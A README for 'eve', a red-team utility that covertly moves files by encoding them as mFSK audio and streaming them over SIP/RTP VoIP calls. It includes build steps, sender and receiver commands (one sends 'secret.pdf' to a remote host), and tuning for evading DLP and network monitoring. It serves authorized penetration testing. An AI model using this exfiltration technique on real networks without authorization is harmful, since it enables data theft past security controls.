# eve — Encoded VoIP Exfil

`eve` is a red-team / penetration-testing utility that transfers arbitrary files between two endpoints by encoding data as [mFSK](https://en.wikipedia.org/wiki/Frequency-shift_keying) (Multiple Frequency-Shift Keying) audio and streaming it over a SIP/RTP VoIP call. It is designed for authorized engagements to test Data-Loss Prevention (DLP) and network-monitoring controls.

> **Authorization required.** Use only on systems and networks you are authorized to test.

---

## Build

```bash
cargo build --release
# Binary: target/release/eve
```

Requires stable Rust (no nightly features). No external C libraries.

---

## Usage

### Receiver (start first)

```bash
eve recv --output-dir /tmp/received/
```

Listens on UDP port 5060 (SIP) and 10000 (RTP) by default.

### Sender

```bash
eve send --file secret.pdf --dest 192.168.1.42:5060
```

Establishes a SIP call to the receiver, encodes the file as mFSK audio, and streams it as RTP/PCMU packets.

### Loopback test (no network)

```bash
eve loopback --file myfile.bin --tones 16
```

Encodes then decodes locally and prints the bit-error-rate (BER). Use `--save-audio output.wav` to export the PCM stream for inspection in Audacity.

---

## Options

| Flag | Default | Description |
|------|---------|-------------|
| `--tones` | 16 | Number of mFSK tones: 2, 4, 8, 16, or 32 |
| `--symbol-rate` | 50 | Symbols per second |
| `--base-freq` | 400 | Lowest tone frequency (Hz) |
| `--tone-spacing` | 100 | Spacing between adjacent tones (Hz) |
| `--frame-size` | 128 | Payload bytes per frame |
| `--sip-port` | 5060 | Local SIP UDP port |
| `--rtp-port` | 10000 | Local RTP UDP port |
| `--jitter-ms` | 60 | Dejitter buffer depth (ms) |
| `--verbose` | off | Print per-symbol diagnostics |
| `--save-audio <PATH>` | — | Dump generated PCM to a WAV file |

---

## mFSK Parameter Tuning

### How it works

1. The file is split into frames (default 128 bytes payload each) with CRC-32 verification.
2. Each frame is serialised to bytes and encoded as a sequence of mFSK symbols.
3. Each symbol maps `log2(M)` bits to one of M frequencies between `base-freq` and `base-freq + (M-1) × tone-spacing` Hz.
4. At 8 kHz (G.711 narrowband), all tones must fit below ~3 400 Hz for compatibility with typical VoIP codecs.
5. A synchronisation preamble (chirp sweep low→high then high→low) is prepended for decoder timing lock.

### Throughput vs. reliability trade-offs

| `--tones` | Bits/symbol | Symbol rate | Raw bitrate | ~Effective |
|-----------|-------------|-------------|-------------|------------|
| 2 | 1 | 50 sym/s | 50 bps | ~40 bps |
| 4 | 2 | 50 sym/s | 100 bps | ~80 bps |
| 8 | 3 | 50 sym/s | 150 bps | ~120 bps |
| 16 | 4 | 50 sym/s | 200 bps | ~160 bps |
| 32 | 5 | 50 sym/s | 250 bps | ~200 bps |

**More tones** → higher throughput but narrower tone spacing, more susceptible to G.711 codec noise, jitter, and VoIP transcoding artefacts.

**Higher `--symbol-rate`** → higher throughput but smaller symbol windows → less accurate Goertzel filter detection.

**Recommended starting point for live VoIP calls:** `--tones 8 --symbol-rate 25` for robustness.

### Bandwidth check

With M=16, tone-spacing=100 Hz, base-freq=400 Hz:
- Highest tone: 400 + 15 × 100 = 1 900 Hz — well within narrowband voice passband.

With M=32, tone-spacing=100 Hz, base-freq=400 Hz:
- Highest tone: 400 + 31 × 100 = 3 500 Hz — marginal; consider reducing spacing to 50 Hz.

---

## Architecture

```
src/
├── main.rs           CLI entry point (clap)
├── config.rs         Shared configuration types
├── pipeline.rs       Async pipeline (framing → codec → VoIP)
├── wav.rs            Minimal WAV writer (no crate)
├── codec/
│   ├── mfsk_encode.rs   Data → mFSK PCM
│   └── mfsk_decode.rs   mFSK PCM → Data (Goertzel + cross-correlation)
├── framing/
│   ├── packetizer.rs    File → Frames (CRC-32, seq numbers)
│   └── depacketizer.rs  Frames → File (reordering, gap detection)
├── voip/
│   ├── sip.rs           Minimal SIP UA (INVITE/200/ACK/BYE)
│   └── rtp.rs           RTP header, G.711 μ-law, dejitter buffer
└── transport/
    └── udp.rs           Async UDP socket wrapper
```

---

## Running Tests

```bash
cargo test           # 44 tests: 42 unit + 2 integration
cargo clippy         # No errors
```
